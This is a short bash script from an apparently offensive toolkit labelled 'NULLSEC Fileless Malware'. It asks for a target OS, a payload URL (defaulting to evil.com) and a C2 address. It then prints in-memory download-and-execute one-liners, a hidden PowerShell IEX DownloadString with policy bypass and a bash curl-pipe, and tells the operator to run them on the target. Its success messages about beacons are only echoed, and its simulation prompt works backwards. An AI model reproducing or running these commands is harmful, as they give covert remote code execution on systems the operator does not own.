#!/bin/bash
# NULLSEC Fileless Malware - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC FILELESS ATTACK ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
echo -e "  ${YELLOW}Target OS:${RESET} 1) Windows  2) Linux"
read -p "$(echo -e ${WHITE}'  [>] Select [1-2]: '${RESET})" OS; [ -z "$OS" ] && OS="1"
read -p "$(echo -e ${WHITE}'  [>] Payload URL: '${RESET})" PAYLOAD_URL; [ -z "$PAYLOAD_URL" ] && PAYLOAD_URL="http://evil.com/payload.ps1"
read -p "$(echo -e ${WHITE}'  [>] C2 address: '${RESET})" C2; [ -z "$C2" ] && C2="10.0.0.1:443"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing fileless attack"
    if [ "$OS" = "1" ]; then
        echo -e "${DIM}[*] Generating PowerShell payload...${RESET}"; sleep 0.5
        echo -e "${CYAN}powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('$PAYLOAD_URL')\"${RESET}"
        echo ""
        echo -e "${DIM}[*] Executing in memory...${RESET}"; sleep 0.8
        echo -e "${GREEN}[+]${RESET} Payload loaded in memory"
        echo -e "${GREEN}[+]${RESET} No disk artifacts"
        echo -e "${GREEN}[+]${RESET} Beacon to $C2"
    else
        echo -e "${DIM}[*] Bash in-memory execution...${RESET}"; sleep 0.5
        echo -e "${CYAN}bash -c \"\$(curl -fsSL $PAYLOAD_URL)\"${RESET}"
    fi
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Execute the shown payload on target"
fi
